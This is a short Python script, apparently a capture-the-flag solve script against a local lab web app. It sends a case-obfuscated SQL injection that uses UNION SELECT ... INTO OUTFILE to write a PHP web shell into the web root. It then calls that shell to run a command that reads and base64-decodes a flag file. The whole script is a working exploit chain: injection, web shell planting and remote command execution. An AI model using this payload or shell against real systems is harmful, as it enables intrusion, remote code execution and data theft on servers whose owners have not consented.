#!/usr/bin/env python3
import requests, urllib.parse, time, base64

BASE = "http://localhost:8080"



payload = "' UnION SeLECT \"<?php system(\\$_GET['c']); ?>\", \"\" InTO OuTFILE '/var/www/html/test_solve_script_shell.php' -- "

print(f'Payload is -->: {payload}')


p = {'query': payload}
request_payload = requests.get(BASE + "/index.php", params=p, timeout=10)


time.sleep(2)

shell_url = BASE + "/test_solve_script_shell.php?c=" + urllib.parse.quote("cat /var/www/html/flag.txt")


request_flag = requests.get(shell_url, timeout=10)
print(f'Sending payload -->')
# Extract flag from http response
print("Extracting flag -->")

encoded_flag=""
lines = [line for line in request_flag.text.splitlines() if line.strip()]
if lines:
    encoded_flag =lines[-1]

print("Decoding flag")
decoded_bytes = base64.b64decode(encoded_flag)
decoded_string = decoded_bytes.decode('utf-8')
print(f'Flag is: {decoded_string}')


